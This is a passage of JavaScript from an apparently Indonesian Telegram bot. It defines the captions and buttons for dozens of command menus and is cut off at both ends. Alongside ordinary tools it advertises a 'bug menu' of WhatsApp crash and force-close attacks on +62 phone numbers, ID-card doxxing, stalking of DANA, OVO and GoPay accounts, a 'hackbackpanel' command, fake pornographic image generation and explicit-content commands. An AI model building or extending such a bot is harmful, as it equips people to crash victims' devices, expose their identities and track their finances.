┃⚝├ /𝚋𝚢𝚙𝚊𝚜𝚜 𝚖𝚎𝚗𝚞       /𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚖𝚎𝚗𝚞     /𝚝𝚘𝚘𝚕𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚐𝚛𝚘𝚞𝚙 𝚖𝚎𝚗𝚞        /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚎𝚊𝚛𝚌𝚑 𝚖𝚎𝚗𝚞       /𝚜𝚝𝚊𝚕𝚔 𝚖𝚎𝚗𝚞
┃⚝├ /𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞        /𝚘𝚠𝚗𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞            /𝚘𝚠𝚗𝚎𝚛𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚖𝚎𝚗𝚞    /𝚠𝚎𝚋 𝚖𝚎𝚗𝚞
┃⚝├ /𝚟𝚙𝚜 𝚖𝚎𝚗𝚞          /𝚜𝚞𝚋𝚍𝚘 𝚖𝚎𝚗𝚞
┃⚝├ /𝚏𝚞𝚗 𝚖𝚎𝚗𝚞          /𝚛𝚙𝚐 𝚖𝚎𝚗𝚞
┃⚝├ /𝚎𝚗𝚌 𝚖𝚎𝚗𝚞          /𝚊𝚗𝚒𝚖𝚎 𝚖𝚎𝚗𝚞
┃⚝└ /𝚛𝚊𝚗𝚍𝚘𝚖 𝚖𝚎𝚗𝚞       /𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚖𝚎𝚗𝚞
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "sᴜʙᴅᴏᴍᴀɪɴ", callback_data: "subdomain" },
                        { text: "ᴄʀᴇᴀᴛᴇ ᴡᴇʙ", callback_data: "webmenu" },
                ],
                [
                        { text: "ʀᴇᴍᴏᴠᴇ", callback_data: "imagetool" },
                        { text: "ᴍᴇɴᴜ ɢᴀᴍʙᴀʀ", callback_data: "gambar" },
                ],
                [
                        { text: "ɪᴍᴀɢᴇ ᴛᴏ", callback_data: "duniamenu" },
                        { text: "ɪɴғᴏ ᴜsᴇʀ", callback_data: "createsesuatu" },
                ],
                [
                        { text: "ɢᴇᴛ ᴡᴇʙ", callback_data: "getcodeweb" },
                        { text: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ", callback_data: "animeanime" },
                ],
                [
                        { text: "◁", callback_data: "seterus" },
                ],
        ];
}
else if (data === "islam") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ɪsʟᴀᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🏚 ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟸𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /niatsholat
┃⚝├ /bacaansholat
┃⚝├ /doaharian
┃⚝├ /doatahlil
┃⚝├ /jadwalsholat
┃⚝├ /kisahnabi
┃⚝├ /asmaulhusna
┃⚝└ /ayatkursi
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus" },
                ],
        ];
}
else if (data === "bugmenu") {
        newCaption =
                `<blockquote><strong>╔━⊱ ̶B̶U̶G ̶M̶E̶N̶U
┏━━━━━『 /ʙᴜɢ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 〽️ ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟻
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /BulldozerDelay - 628×͜×
┃╰➽ѕє∂σт кυσтα нαя∂
┃⚝├ /ForceCloseOri - 628×͜×
┃╰➽ѕραм ƒ¢ ∂єℓєтє∂
┃⚝├ /CrashAndro - 628×͜×
┃╰➽ƒяєєzє χ ¢яαѕн αηяσι∂
┃⚝├ /ForceCloseios - 628×͜×
┃╰➽ιηνιѕ ƒ¢ ιρнσηє
┃⚝└ /BlankUiCrash - 628×͜×
┃╰➽ησтιƒιкαѕι вℓαηk χ ¢яαѕн
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>
<blockquote>NOTE: <strong><u>Gunakan WhatsApp Messenger Untuk Bug, Tidak Di Saran Kan Memakai WhatsApp Bussiness</u></strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "maiinmenu" },
                ],
        ];
}
else if (data === "tqto") {
        newCaption =
                `<blockquote><b>┏━━━━━『 ᴛʜᴀɴᴋ'ꜱ ᴛᴏ 』━━━━━━━┓
┃ 🤍 𝗖𝗿𝗲𝗱𝗶𝘁 & 𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗧𝗵𝗮𝗻𝗸𝘀
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌  @Rizzxtzy — Author Elika
┃⚝├  @VINZXSTORE — Tk Priv
┃⚝├  @skyzoNewEra — Tk Priv
┃⚝├  @AditXxy — Tk Priv
┃⚝├  @Gabrieltzyproooool — Dev Void
┃⚝├  @YSCELL05 — Tk Priv
┃⚝├  @yuncbb — Best Friend
┃⚝├  @xlilnyx — Best Friend
┃⚝├  @modhzy — Best Friend
┃⚝├  @Lorddzik — Best Friend
┃⚝├  @frmnzz25 — Best Friend
┃⚝├  @Xatanicvxii — Dev Tredict
┃⚝├  @Otapengenkawin — Dev Otax
┃⚝└  <strong>ALL Partner & Buyer</strong>
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</b></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "maiinmenu" },
                ],
        ];
}
else if (data === "sawer") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴀᴡᴇʀɪᴀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 💰 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /prem
┃⚝├ /listprem
┃⚝├ /unprem
┃⚝├ /rekaptransaksi
┃⚝├ /claimhadiah1
┃⚝├ /claimhadiah2
┃⚝├ /batalbeli
┃⚝├ /spin1
┃⚝├ /gachapeti
┃⚝└ /login
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus" },
                ],
        ];
}
else if (data === "webmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴡᴇʙ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🃏 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟽
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /createweb
┃⚝├ /cwen
┃⚝├ /listweb
┃⚝├ /delweb
┃⚝├ /createnetlify
┃⚝├ /delnetlify
┃⚝└ /listnetlify
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "digitalOcean") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴠᴘs ᴍᴇɴᴜ 』━━━━━━━┓
┃ ✨ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /cvps
┃⚝├ /cvps2
┃⚝├ /createvps
┃⚝├ /sisadroplet
┃⚝├ /deldroplet
┃⚝├ /listdroplet
┃⚝├ /rebuild
┃⚝├ /restartvps
┃⚝├ /startvps
┃⚝└ /stopvps
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus" },
                ],
        ];
}
else if (data === "subdomain") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴜʙᴅᴏ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 💲 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /subdomain
┃⚝├ /createdomain
┃⚝├ /delsubdo
┃⚝├ /listdns
┃⚝├ /delallsubdo
┃⚝└ /res_list_dns_record
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "claim") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴄʟᴀɪᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎁 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /claimbug      [200k Saldo]
┃⚝├ /claimdb       [250k Saldo]
┃⚝├ /claimcvps     [350k Saldo]
┃⚝├ /claimeternal  [950k Saldo]
┃⚝└ /claimmd       [200k Saldo]
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃ 💡 ᴄᴀᴛᴀᴛᴀɴ :
┃⚝┌ Setiap bermain +25.000 Saldo
┃⚝├ /claimmd ≠ Elika MD
┃⚝└ Script MD WhatsApp
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus" },
                ],
        ];
}
else if (data === "games") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ɢᴀᴍᴇs ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎮 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /tekateki
┃⚝├ /susunkata
┃⚝├ /siapaaku
┃⚝├ /family100
┃⚝├ /asahotak
┃⚝├ /tictactoe
┃⚝├ /ceksaldo
┃⚝├ /addsaldo
┃⚝├ /minsaldo
┃⚝└ /allsaldo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "tebak") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴛᴇʙᴀᴋ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧩 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /tebaktebakan
┃⚝├ /tebakkata
┃⚝├ /tebakkabupaten
┃⚝├ /tebakgambar
┃⚝├ /ceksaldo
┃⚝└ /allsaldo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "catat") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴄᴀᴛᴀᴛᴀɴ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 📝 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addpendapatan
┃⚝├ /delpendapatan
┃⚝├ /listpendapatan
┃⚝├ /totalpendapatan
┃⚝├ /resetpendapatan
┃⚝├ /addhutang
┃⚝├ /delhutang
┃⚝├ /listhutang
┃⚝├ /resethutang
┃⚝├ /adddp
┃⚝├ /deldp
┃⚝├ /listdp
┃⚝└ /resetdp
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "storemenuu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴛᴏʀᴇ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛒 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addrespon
┃⚝├ /delrespon
┃⚝├ /listrespon
┃⚝├ /proses
┃⚝├ /done
┃⚝├ /produk
┃⚝├ /payment
┃⚝├ /cek
┃⚝└ /sendtesti
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "jasher") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴊᴀsʜᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧰 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /jasher
┃⚝├ /jasher2
┃⚝├ /listgroup
┃⚝├ /addgroupid
┃⚝├ /delgroupid
┃⚝├ /savegroup
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        {
                                text: "➕ Add to Group",
                                url: `https://t.me/${bot.botInfo?.username}?startgroup=true`,
                        },
                ],
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "bypass") {
        newCaption =
                `<blockquote><b>┌───「 ʙʏᴘᴀss ᴍᴇɴᴜ 」───┐
├ 👋 Selamat datang, ${ctx.from.first_name}!
├ ◦ Total users : ${totalToday}
├─────────────────
├ Kirim file .js untuk mulai diproses.
└─────────────────</b></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "install") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ɪɴsᴛᴀʟʟ ᴍᴇɴᴜ 』━━━━━━━┓
┃ ⚙️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /startwings
┃⚝├ /hackbackpanel
┃⚝├ /installtema
┃⚝├ /installpanel
┃⚝├ /uninstalltema
┃⚝├ /uninstallpanel
┃⚝├ /installtemastellar
┃⚝├ /installtemaelysium
┃⚝├ /installdepend   [pasang sebelum nebula]
┃⚝├ /installtemanebula
┃⚝├ /installtemaenigma
┃⚝└ /installtemabilling
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "storemenu" },
                ],
        ];
}
else if (data === "downloadmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ ⬇️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /capcutdl
┃⚝├ /facebook
┃⚝├ /gdrive
┃⚝├ /ig
┃⚝├ /mediafire
┃⚝├ /pin
┃⚝├ /terabox
┃⚝├ /tiktok
┃⚝├ /twitter
┃⚝├ /twitterimage
┃⚝├ /videydl
┃⚝├ /ytdl
┃⚝├ /play
┃⚝├ /playch
┃⚝├ /spotify
┃⚝├ /lyrics
┃⚝├ /ytmp3
┃⚝├ /ytmp4
┃⚝├ /lyricsearch
┃⚝└ /berita
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "gambar") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎨 ᴄʀᴇᴀᴛɪᴠᴇ
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /animbrat
┃⚝├ /brat
┃⚝├ /brat2
┃⚝├ /qc
┃⚝├ /iqc
┃⚝├ /nulis
┃⚝├ /txttoghibli
┃⚝└ /fakexnxx
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "imagetool") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🖼️ ɪᴍᴀɢᴇ ᴛᴏᴏʟs
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /removebg
┃⚝├ /resize
┃⚝├ /hd
┃⚝├ /colorize
┃⚝├ /dewatermark
┃⚝├ /hijabkan
┃⚝├ /toimg
┃⚝└ /tosticker
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "duniamenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🌍 ɪɴꜰᴏ & ᴜᴛɪʟɪᴛʏ
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /cekid
┃⚝├ /getid
┃⚝├ /getpp
┃⚝├ /countryinfo
┃⚝├ /infogempa
┃⚝├ /info
┃⚝├ /ping
┃⚝└ /trackip
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "createsesuatu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🔗 ᴄᴏɴᴠᴇʀᴛ & ᴛᴏᴏʟs
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /tourl
┃⚝├ /ssweb
┃⚝├ /cloneweb
┃⚝├ /open
┃⚝├ /getlink
┃⚝├ /readqr
┃⚝├ /qr2text
┃⚝└ /text2qr
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "getcodeweb") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 💻 ᴄᴏᴅᴇ & ꜰɪʟᴇ
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /getcode
┃⚝├ /getcodezip
┃⚝├ /tojs
┃⚝├ /tocode
┃⚝├ /text2base64
┃⚝└ /text2binary
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "toolsmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴛᴏᴏʟs ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛠️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟺
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /pakustad
┃⚝├ /pakustad2
┃⚝├ /doxktp
┃⚝└ /translate
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "groupmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ɢʀᴏᴜᴘ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 👥 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /status
┃⚝├ /warn
┃⚝├ /bukajam
┃⚝├ /tutupjam
┃⚝├ /add
┃⚝├ /kick
┃⚝├ /promote
┃⚝├ /demote
┃⚝├ /mute
┃⚝├ /unmute
┃⚝├ /antilink
┃⚝├ /antimedia
┃⚝└ /setforwardchat
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "aimenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴀɪ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🤖 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /gpt4o
┃⚝├ /deepseek
┃⚝├ /gemini
┃⚝├ /aiedit
┃⚝├ /fixcode
┃⚝├ /editcode
┃⚝├ /fixcodeerror   [error]
┃⚝├ /plugintelegraf
┃⚝└ /plugintelegram
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "stalkmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴛᴀʟᴋ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🕵️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /githubstalk
┃⚝├ /instagramstalk
┃⚝├ /tiktokstalk
┃⚝├ /twitterstalk
┃⚝├ /pintereststalk
┃⚝├ /youtubestalk
┃⚝├ /danastalk
┃⚝├ /ovostalk
┃⚝└ /gopaystalk
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "searchmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴇᴀʀᴄʜ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🔍 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /ytsearch
┃⚝├ /ttsearch
┃⚝├ /animequote
┃⚝├ /bingimg
┃⚝├ /googleimg
┃⚝├ /pinterest
┃⚝├ /stiktok
┃⚝├ /syoutube
┃⚝└ /bstationsearch
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "allmenu" },
                ],
        ];
}
else if (data === "panelmenu") {
        newCaption =
                `<blockquote><strong>┏━━『 /ᴘᴀɴᴇʟ ᴍᴇɴᴜ 』━━┓
┃🖥️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟽
┃     RAM → CPU
┣━━━━━━━━━━━━━━❖
┃⚝ ┌ 1–8GB   → 30–240%
┃⚝ ├ 9–16GB  → 270–480%
┃⚝ ├ 17–32GB → 510–960%
┃⚝ ├ 33–64GB → 990–1920%
┃⚝ └ UNLI    → ∞
┣━━━━━━━━━━━━━━❖
┃⚝ Contoh:
┃⚝ ┌ /1gb Dragon,7907134865
┃⚝ └ /unli Dragon,7907134865
┣━━━━━━━━━━━━━━❖
┃⚝ ┌ /listsrv
┃⚝ ├ /delsrv
┃⚝ ├ /listusr
┃⚝ ├ /delusr
┃⚝ └ /listadmin
┗━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "ownerMenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴏᴡɴᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 👑 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /broadcast
┃⚝├ /upch
┃⚝├ /ban
┃⚝├ /unban
┃⚝├ /listban
┃⚝├ /listuser
┃⚝├ /listpengguna
┃⚝├ /listgroup
┃⚝├ /delaccess
┃⚝├ /addpremium [id] [hari]
┃⚝├ /delpremium [id]
┃⚝├ /listpremium
┃⚝├ /cekprem [id]
┃⚝├ /buatfunc
┃⚝├ /csessions
┃⚝├ /fitur on (menyalakan bot)
┃⚝├ /fitur off (mematikan bot)
┃⚝├ /addcreds
┃⚝└ /delpremium
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "ownermenu" },
                ],
        ];
}
else if (data === "botfitur") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ʙᴏᴛ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🤖 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /show
┃⚝├ /file
┃⚝├ /change [kode]
┃⚝├ /ganti [file]
┃⚝├ /restart
┃⚝├ /convertplugin
┃⚝├ /buatkanplugin
┃⚝├ /listplugin
┃⚝├ /addplugin
┃⚝├ /delplugin
┃⚝├ /backup
┃⚝└ /backup2
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "ownermenu" },
                ],
        ];
}
else if (data === "development") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧑‍💻 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addsender +62xx
┃⚝├ /listsender
┃⚝├ /userlist
┃⚝├ /subdomain
┃⚝├ /broadcast
┃⚝├ /addstock
┃⚝├ /delstock
┃⚝├ /addstockdo
┃⚝├ /delstockdo
┃⚝├ /getstock
┃⚝├ /getstockdo
┃⚝├ /addscript
┃⚝├ /delscript
┃⚝├ /getscript
┃⚝├ /ping
┃⚝└ /vpsinfo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "ownermenu" },
                ],
        ];
}
else if (data === "ownerpanel") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴘᴀɴᴇʟ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛡️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟻
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addowner [id]
┃⚝├ /delowner [id]
┃⚝├ /addprem [id]
┃⚝├ /delprem [id]
┃⚝└ /listadmin
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "ownermenu" },
                ],
        ];
}
else if (data === "ownermenu") {
        newCaption =
                `<blockquote><b>┌───「 ᴘᴀɴᴇʟ ᴍᴇɴᴜ 」───┐
├ ◦ PILIH MENU DI BAWAH UNTUK
├ ◦ MENAMPILKAN FITUR-FITUR OWNER
└─────────────────</b></blockquote>`;

        newButtons = [
                [
                        { text: "ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", callback_data: "ownerpanel" },
                        { text: "ᴏᴡɴᴇʀ ʙᴏᴛ", callback_data: "botfitur" },
                ],
                [
                        { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", callback_data: "development" },
                        { text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "ownerMenu" },
                ],
                [
                        { text: "〶", callback_data: "maiinmenu" },
                ],
        ];
}
else if (data === "funmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ꜰᴜɴ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎭 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /asupan
┃⚝├ /paptt
┃⚝├ /paptt2
┃⚝├ /nsfwimg
┃⚝├ /xnxxvid
┃⚝├ /xnxxvideo
┃⚝├ /xnxxsearch
┃⚝├ /xnxxsearch2
┃⚝├ /nhentai [query] [page]
┃⚝├ /xvideos
┃⚝├ /xsearch
┃⚝├ /cecanindo
┃⚝├ /cecanjapan
┃⚝├ /cecankorea
┃⚝├ /cecanchina
┃⚝├ /cecanthailand
┃⚝├ /cecanvietnam
┃⚝├ /cekkhodam
┃⚝├ /cekkontol
┃⚝├ /bisakah
┃⚝├ /cosplay
┃⚝├ /cosplaytele
┃⚝└ /done
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "rpgmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ʀᴘɢ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🗺️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
